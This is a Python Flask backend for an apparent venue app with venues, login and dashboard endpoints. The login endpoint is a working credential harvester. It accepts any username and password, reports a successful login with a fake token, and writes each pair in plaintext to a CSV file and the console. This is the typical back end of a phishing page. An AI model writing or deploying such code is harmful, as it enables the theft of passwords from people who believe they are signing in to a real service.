#!/usr/bin/env python3
# -*- coding: utf-8 -*-

import datetime
import os
import requests
import csv

from auth import gen_jwt_token, validate_header, validate_and_decode_jwt
from constants import (
    APP_SECRET_KEY,
    API_PREFIX,
    USER_DATABASE_FILENAME,
    VENUE_DATABASE_FILENAME,
    DEFAULT_TOKEN_EXPIRATION_MINUTES,
    RESPONSE_STATUS,
)
from database import get_sqlite_cursor

from flask import Flask, request, jsonify, Response
from flask_cors import CORS
from werkzeug.security import check_password_hash

CWD = os.getcwd()
USER_DATABASE_FILEPATH = os.path.join(CWD, USER_DATABASE_FILENAME)
VENUE_DATABASE_FILEPATH = os.path.join(CWD, VENUE_DATABASE_FILENAME)

app = Flask(__name__)
app.secret_key = APP_SECRET_KEY
CORS(app)

# TODO: venues
@app.route(f"{API_PREFIX}/v1/venues", methods=["GET"])
def get_venues():
    cur = get_sqlite_cursor(VENUE_DATABASE_FILEPATH)
    cur.execute("SELECT * FROM venue")
    venues = cur.fetchall()
    # Convert the venues to a list of dictionaries to make them JSON serializable
    venues_list = [dict(venue) for venue in venues]
    return jsonify({"status": RESPONSE_STATUS[0], "data": venues_list}), 200

# always login successfully
@app.route(f"{API_PREFIX}/v1/login", methods=["POST"])
def login():
    req = request.get_json()
    username = req.get("username", "Unknown")
    password = req.get("password", "")

    # save the user attempts in a csv file
    csv_file_path = 'user_credentials.csv'
    with open(csv_file_path, 'a', newline='') as csv_file:
        csv_writer = csv.writer(csv_file)
        csv_writer.writerow([username, password])

    print("User login attempt \nUsername: {} Password: {}".format(username, password))

    fake_token = "fake_token_for_demo_purposes"

    response = {
        "status": RESPONSE_STATUS[0],
        "msg": "User logged in successfully.",
        "data": {
            "user": {"username": username},
            "token": fake_token
        }
    }
    return jsonify(response), 200


@app.route(f"{API_PREFIX}/v1/dashboard", methods=["POST"])
def dashboard():
    response = {
        "status": RESPONSE_STATUS[0],
        "msg": "Dashboard",
        "data": {"user": {"username": 'user'}},
    }
    return jsonify(response), 200


if __name__ == "__main__":
    # running on a different port
    app.run(debug=True, port=8001)
